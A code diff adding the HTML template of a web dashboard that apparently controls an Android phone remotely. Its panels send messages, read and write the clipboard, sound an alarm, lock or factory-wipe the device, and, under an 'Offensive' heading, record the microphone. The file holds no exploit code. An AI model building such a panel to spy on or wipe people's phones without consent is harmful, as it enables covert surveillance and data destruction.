@@ -1,0 +1,288 @@
+<div class="row row-eq-spacing-sm">
+    <div class="col-sm-3">
+        <div class="content">
+            <div class="card p-0 sponsor-section-card w-200  overflow-y-auto mw-full m-0 ">
+                <div class="m-auto ml-0 p-0">
+                    <div class="sidebar-menu mt-0">
+                        <h5 class="sidebar-title">Miscellaneous</h5>
+                        <div class="sidebar-divider"></div>
+                        <a href="#" id="menu_messagetoast" onclick="openLink(event, 'tabMessageToast')" class="commands-menu sidebar-link sidebar-link-with-icon">
+                            <span class=" sidebar-icon ">
+                                <span class="material-icons md-18">textsms</span>
+                            </span> Message
+                        </a>
+                        <a href="#" id="menu_messagetoast" onclick="openLink(event, 'tabClipBoard')" class="commands-menu sidebar-link sidebar-link-with-icon">
+                            <span class=" sidebar-icon ">
+                                <span class="material-icons md-18">content_paste</span>
+                            </span> Clipboard
+                        </a>
+                        <h5 class="sidebar-title">Security</h5>
+                        <div class="sidebar-divider"></div>
+                        <a href="#" onclick="openLink(event, 'tabAlarm')" class="commands-menu sidebar-link sidebar-link-with-icon">
+                            <span class=" sidebar-icon ">
+                                <span class="material-icons md-18">security_update_warning</span>
+                            </span> Alarm
+                        </a>
+                        <a href="#security" onclick="openLink(event, 'tabSecurityDevice')" class="commands-menu sidebar-link sidebar-link-with-icon">
+                            <span class=" sidebar-icon ">
+                                <span class="material-icons md-18">lock</span>
+                            </span> Security
+                        </a>
+                        <a href="#" onclick="openLink(event, 'tabPermission')" class="commands-menu sidebar-link sidebar-link-with-icon">
+                            <span class=" sidebar-icon ">
+                                <span class="material-icons md-18">
+                                    app_settings_alt
+                                    </span>
+                            </span> Permission
+                        </a>
+                        <h5 class="sidebar-title">Offensive</h5>
+                        <div class="sidebar-divider"></div>
+                        <a href="#recordermic" onclick="openLink(event, 'tabRecordAudio')" class="commands-menu sidebar-link sidebar-link-with-icon">
+                            <span class=" sidebar-icon ">
+                                <span class="material-icons md-18 ">mic</span>
+                            </span> Recorder MIC
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="col-sm-9 ml-0">
+        <div class="content ">
+
+            <div id="tabRecordAudio" class="tab-div w3-animate-right" style="display:none">
+                <h4>Recorder Audio Mic</h4>
+                <div class=" ml-0 m-10 d-flex">
+                    <div class="input-group mr-10 w-300">
+                        <input type="text" id="inputTimeout" class="form-control" placeholder="Timeout record audio">
+                        <div class="input-group-append">
+                            <span class="input-group-text">Max: (50 Seconds)</span>
+                        </div>
+                    </div>
+                    <button class="btn btn-primary" id="btnGetAudio" type="button">Send</button>
+                </div>
+                <p class="text-muted">
+                    <strong>OBS:</strong> The audio recorded are not saved in the database just in the session. The <strong>session</strong> lifetime should be duration in <span class="p-5 rounded text-danger text-smoothing-auto">two days</span>.
+                </p>
+                <div class="progress-group mb-10">
+                    <div class="progress">
+                        <div class="progress-bar progress-bar-animated" role="progressbar" style="width: 0%;" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100"></div>
+                    </div>
+                </div>
+
+                <div id="list_audios">
+                    {% include 'pages/commands/list_audios.html'%}
+                </div>
+
+            </div>
+
+            <div id="tabSecurityDevice" class="tab-div w3-animate-right" style="display:none">
+                <h4>Security</h4>
+                <div class="content m-0 p-0">
+                    <p class="font-size-14"> The security feature require <a class="hyperlink" href="https://developer.android.com/guide/topics/admin/device-admin" target="_blank" rel="noopener"> Device administration </a> for lock device remotely. Some applications use the device
+                        admin for consumer device administration, e.g. locking and wiping a lost device. checkout how to enable on your mobile:</p>
+                    <ul>
+                        <li class="text-muted">
+                            <strong> Activate:</strong> Open the app on mobile and go to the extension.
+                        </li>
+                        <li class="text-muted">
+                            <strong> Permission:</strong> When the user clicks the Enable Admin checkbox, the display changes to prompt the user to activate the device admin app.
+                        </li>
+                    </ul>
+                    <button class="btn" id="btnCheckPermission" type="button">Check permission</button>
+
+                </div>
+                <hr />
+                <div class="content m-0 p-0">
+                    <h5>Lock device</h5>
+                    <p class="text-muted m-0 p-0">Make the device lock immediately, as if the lock screen timeout has expired at the point of this call.</p>
+                    <div class=" ml-0 m-10 p-0 ">
+                        <button class="btn btn-primary mr-20" id="btnSetLocked" type="button">Lock now</button>
+                    </div>
+                    <hr />
+                    <div>
+                        <h5>Maximum inactivity time lock</h5>
+                        <p class="text-muted m-0 p-0">Sets the length of time since the user last touched the screen or pressed a button before the device locks the screen.</p>
+                        <div class=" ml-0 m-10 d-flex">
+                            <div class="input-group mr-10 w-300">
+                                <input type="text" id="inputSetMaxLock" class="form-control" placeholder="Timeout ">
+                                <div class="input-group-append">
+                                    <span class="input-group-text">(Time in seconds )</span>
+                                </div>
+                            </div>
+                            <button class="btn btn-primary" id="btnSetMaxLock" type="button">Set</button>
+                        </div>
+                    </div>
+                    <hr />
+                    <div>
+                        <h5>Wipe the device's data</h5>
+                        <p class="text-muted m-0 p-0">Restore the device to its factory defaults</p>
+                        <p class="text-muted">Ask the user date be wiped. This will cause the device to reboot, erasing all user data while next booting up. External storage such as SD cards will be also.</p>
+                        <div class=" ml-0 m-10 d-flex">
+                            <button id="btnWipeData" class="btn btn-danger" type="button">Reset data</button>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+
+            <div id="tabMessageToast" class="tab-div w3-animate-right" style="display:none">
+                <h4>Message Toast</h4>
+                <div class="content m-0 p-0">
+
+                    <div class="row">
+                        <div class="col-md-6">
+                            <p class="text-muted m-0 p-0">Android Toast is a small message displayed on the screen, similar to a tool tip or other similar popup notification. </p>
+                            <div class=" ml-0 m-10 d-flex">
+                                <div class="input-group mr-10 w-300">
+                                    <input type="text" id="inputMessageToast" class="form-control" placeholder="Message ">
+                                </div>
+                                <button class="btn btn-primary" id="btnMessageToast" type="button">Send</button>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <!-- Responsive image -->
+                            <div class="text-center">
+                                <img src="{{ url_for('static', filename= 'images/command_message.svg') }}" class="img-fluid rounded" alt="...">
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+
+            </div>
+
+            <div id="tabClipBoard" class="tab-div w3-animate-right" style="display:none">
+                <div class="content m-0 p-0">
+
+                    <div class="row">
+                        <div class="col-md-6 mr-20">
+                            <h4>Clipboard</h4>
+                            <p class="text-muted m-0 p-0">Android provides a powerful clipboard-based framework for copy and paste procedures. </p>
+                            <div class=" ml-0 m-10 d-flex">
+                                <div class="input-group mr-100">
+                                    <textarea class="form-control" id="textareaDataText" placeholder="Sends and receives the device's clipboard"></textarea>
+                                </div>
+                            </div>
+                            <div class=" ml-0 m-10 d-flex">
+                                <div class="input-group mr-100 w-300 mr-10">
+                                    <select class="form-control" id="selectClipboardOption">
+                                        <option value="" selected="selected" disabled="disabled">Select a option</option>
+                                        <option value="copy">Copy</option>
+                                        <option value="paste">Paste</option>
+                                      </select>
+                                </div>
+                                <button class="btn btn-primary" id="btnSendClipboard" type="button">Apply</button>
+                            </div>
+
+                            <p>Guidelines: </p>
+                            <ul>
+                                <li class="text-muted">
+                                    <strong>Copy</strong> - Receive the system clipboard device.
+                                </li>
+                                <li class="text-muted">
+                                    <strong>Paste</strong> - Sends the new text to clipboard from device.
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="col-md-4">
+                            <p>Limited access to clipboard Data</p>
+                            <p>Your app cannot access the Clipboard manager for background Apps on android 10 or higher.</p>
+                            <p>So still we can access the clipboard data in Android 10 in the Main thread of the Android apps. </p>
+                            <div class="text-center">
+                                <img src="{{ url_for('static', filename= 'images/command_clipboard.svg') }}" class="img-fluid rounded" alt="...">
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+
+            </div>
+
+            <div id="tabPermission" class="tab-div w3-animate-right" style="display:none">
+                <h4>Permission Granted</h4>
+                <div class="content m-0 p-0">
+                    <div class="row ">
+                        <div class="col-md-6">
+                            <p class="text-muted m-0 p-0">To check if the user has already granted your app a particular permission, pass that permission into the field to check if has the permission.</p>
+                            <p class="text-muted m-0 p-0">Example: Constant Value: "android.permission.ACCESS_NETWORK_STATE" </p>
+                            <p class="text-muted m-0 p-0">checkout : <a class="hyperlink" href="https://developer.android.com/reference/android/Manifest.permission" target="_blank" rel="noopener">Manifest.permission </a> </p>
+                            <div class=" ml-0 m-10 d-flex">
+                                <div class="input-group mr-10 w-300">
+                                    <input type="text" id="inputPermission" class="form-control" placeholder="Permission ">
+                                </div>
+                                <button class="btn btn-primary" id="btnPermissionCheck" type="button">Check</button>
+                            </div>
+                            <hr />
+                            <div id="resultPermission">
+
+                            </div>
+
+                        </div>
+                        <div class="col-md-6">
+                            <div class="text-center">
+                                <img src="{{ url_for('static', filename= 'images/command_permission.svg') }}" class="img-fluid rounded" alt="...">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+            <div id="tabAlarm" class="tab-div w3-animate-right" style="display:none">
+                <h4>Alarm device</h4>
+                <div class="content m-0 p-0 ">
+                    <div class="row ">
+                        <div class="col-md-6">
+                            <p class="text-muted m-0 p-0">Send remotely sound an alarm on your device (even when it’s in silent mode).</p>
+                            <div class="content mt-10 m-0 p-0 ">
+
+                                <div class="row ">
+                                    <button class="btn btn-primary mr-10" id="btnStartAlarm" type="button"> Start</button>
+                                    <button class="btn disabled" id="btnStopAlarm" type="button"> Stop</button>
+                                </div>
+                                <div class="content ">
+                                    <ul>
+                                        <li class="text-muted">
+                                            Turn off the silent mode and start to play alarm background
+                                        </li>
+                                        <li class="text-muted">
+                                            This Should be sets the volume to the maximum level
+                                        </li>
+                                    </ul>
+                                </div>
+
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+
+                            <div class="text-center">
+                                <img src="{{ url_for('static', filename= 'images/command_alarm.svg') }}" class="img-fluid rounded" alt="...">
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    function openLink(evt, animName) {
+        var i, x, tablinks;
+        x = document.querySelectorAll('.tab-div');
+
+        for (i = 0; i < x.length; i++) {
+            x[i].style.display = "none ";
+        }
+        tablinks = document.querySelectorAll(".commands-menu");
+        for (i = 0; i < tablinks.length; i++) {
+            tablinks[i].className = tablinks[i].className.replace("active", " ");
+        }
+        document.getElementById(animName).style.display = "block ";
+        evt.currentTarget.className += " active ";
+    }
+    document.getElementById("menu_messagetoast").click();
+</script>
